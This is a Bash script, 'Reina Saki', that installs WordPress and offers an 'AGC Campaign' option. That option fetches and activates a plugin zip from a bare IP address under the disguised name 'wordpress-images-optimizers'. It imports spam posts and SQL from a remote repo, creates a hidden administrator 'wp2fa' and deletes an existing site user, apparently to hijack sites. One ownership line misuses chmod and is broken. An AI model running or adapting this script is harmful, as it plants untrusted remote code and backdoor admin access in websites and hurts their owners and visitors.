#!/bin/bash 
# Reina Saki v.0.1


#		---	Colors
red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
norm="\033[0m"

source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
sql_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.txt"
owner=$(echo -e "$(pwd)" | cut -d "/" -f3)
if [[ $(id | grep "root" ) ]]; then extra="--allow-root"; else extra=""; fi


_INSTALLWP() {
	echo -e ""
	#	----	VAR		----
	echo -e "[+][STEP 1]-----------------------------------"
	echo ""
	read -p $" [+] Directory name: " dir
	read -p $" [+] DB HOST       : " dbhost
	read -p $" [+] DB NAME       : " dbname
	read -p $" [+] DB USER       : " dbuser
	read -p $" [+] DB PASSWORD   : " dbpass
	read -p $" [+] DB PREFIX     : " dbprefix
	echo ""
	echo -e "[+][STEP 2]----------------------------------"
	echo ""
	read -p $" [+] URL [e.g:example.com/blog/]   : " url
	read -p $" [+] TITLE                         : " title
	read -p $" [+] ADMIN USERNAME                : " username
	read -p $" [+] ADMIN PASSWORD                : " password
	read -p $" [+] ADMIN EMAIL                   : " email

	echo -e ""
	echo -e "${blue}[~]${norm} Downloading Wordpress"
	wget -q https://wordpress.org/latest.zip
	echo -e "${blue}[~]${norm} Inflating Wordpress"
	unzip -q "latest.zip" && rm -rf "latest.zip" && mv "wordpress" ${dir} && cd ${dir}
	
	echo -e "${blue}[~]${norm} Downloading wp-cli.phar"
	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar

	#	Creating config file
	php wp-cli.phar core config --dbhost="${dbhost}" --dbname="${dbname}" --dbuser="${dbuser}" --dbpass="${dbpass}" --dbprefix="${dbprefix}" $extra
	php wp-cli.phar core install --url="${url}" --title="${title}" --admin_user="${username}" --admin_email="${email}" $extra
	php wp-cli.phar user list $extra

	echo -e "${blue}[~]${norm} Updating your default password"
	php wp-cli.phar user update 1 --user_pass="${password}" $extra

	php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'siteurl'" $extra
	php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'home'" $extra
	
	echo -e "${green}[+]${norm} http://${url}/wp-login.php"
	echo -e "${green}[+] Username:${norm} ${username}${green} [+] password:${norm} ${password} | ${green}Have Fun ntol! ${norm}"
	if [[ $extra == "--allow-root" ]];
	then
		echo -ne "${red}[!]${norm} You're currently using 'root access', wanna change the owner of${green} ${dir}${norm} to user? (y/n)"
		read -p $"" owneroption
		if [[ $owneroption == "y" ]] || [[ $owneroption == "Y" ]] || [[ $owneroption == "yes" ]];
		then
			read -p $"[+] Owner: " suowner
			chmod -R ${suowner}:${suowner} ${dir}
			echo -e "${green}[+] Success.${norm} Folder ${dir} changed to ${suowner}:${suowner}"
		else
			echo -e "${red}[-]${norm} Nothing? :("
		fi
	fi

}


_INSTALLAGC() {
	username="wp2fa"
	if [[ $extra == "--allow-root" ]];
	then
		echo -ne "${red}[!]${norm} You're currently using 'root access', Please input user owner (e.g:${green} www-data${norm})"
		read -p $"" owner
	fi

	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar

		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
		#php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'" $extra
	echo -e "${blue}[~]${norm} Installing Plugin..."
		php wp-cli.phar plugin install ${source_campaign} --activate $extra
		
		if [[ $extra == "--allow-root" ]];
		then
			echo -e "${blue}[~]${norm} Changing the owner of the plugin folder."
			chown -R ${owner}:${owner} ./wp-content/plugins/wordpress-images-optimizers/
		fi
		php wp-cli.phar plugin install wordpress-importer --activate $extra
				if [[ $extra == "--allow-root" ]];
		then
			echo -e "${blue}[~]${norm} Changing the owner of the plugin folder."
			chown -R ${owner}:${owner} ./wp-content/plugins/wordpress-importer/
		fi
		wget ${xml_agc} -O agc.xml
		php wp-cli.phar import agc.xml --authors=create $extra
		wget ${sql_agc} -O agc.sql
		sed -i -e 's/blogwpx_/'"$(php wp-cli.phar db prefix $extra)"'/g' agc.sql
		php wp-cli.phar db import agc.sql $extra
		php wp-cli.phar user create ${username} adminwordpress@mailwordpress.com --role=administrator $extra
	echo -e "${green}[+] Username:${norm} ${username}"
		php wp-cli.phar user delete "SangamUni2020" --reassign=1 $extra
		php wp-cli.phar user list $extra
	echo -e "${blue}[~]${norm} Changing Permalinks"
		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
	echo -e "${green}[+] Dumping wp-cron-event-list"
		php wp-cli.phar cron event list $extra

}



echo -ne "${blue}[~]${norm} Checking WP-CLI.phar is supported or not...\r" && sleep 0.8
curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
if [[ $(php wp-cli.phar $extra | grep "WP-CLI only works correctly from the command line") ]];
then
	echo -ne "${red}[!]${norm} Sorry, Wp-cli is not supported!                           \r" && exit
else
	echo -ne "${green}[+]${norm} Congrats, Wp-cli is supported!                          \r" && sleep 0.8
fi

rm -rf "wp-cli.phar"

echo -e "



   ██████╗ ███████╗██╗███╗   ██╗ █████╗     ███████╗ █████╗ ██╗  ██╗██╗
   ██╔══██╗██╔════╝██║████╗  ██║██╔══██╗    ██╔════╝██╔══██╗██║ ██╔╝██║
   ██████╔╝█████╗  ██║██╔██╗ ██║███████║    ███████╗███████║█████╔╝ ██║
   ██╔══██╗██╔══╝  ██║██║╚██╗██║██╔══██║    ╚════██║██╔══██║██╔═██╗ ██║
   ██║  ██║███████╗██║██║ ╚████║██║  ██║    ███████║██║  ██║██║  ██╗██║
   ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝

   ${red}[!] ${norm}Please run from public_html [wp] if you're using root.
                                                                    

"
echo -e "
  ===============================

    [1] Install Wordpress
    [2] Install AGC [Campaign]

 ===============================
"
read -p $": Select Option : " option

if [[ $option == "1" ]];
	then
		_INSTALLWP 
elif [[ $option == "2" ]];
	then
		_INSTALLAGC
elif [[ $option == "0" ]];
	then
		exit
else
	echo -e "Pilihen Goblok!"
fi


rm -rf "agc.sql"
rm -rf "agc.xml" && rm -rf "wp-cli.phar"
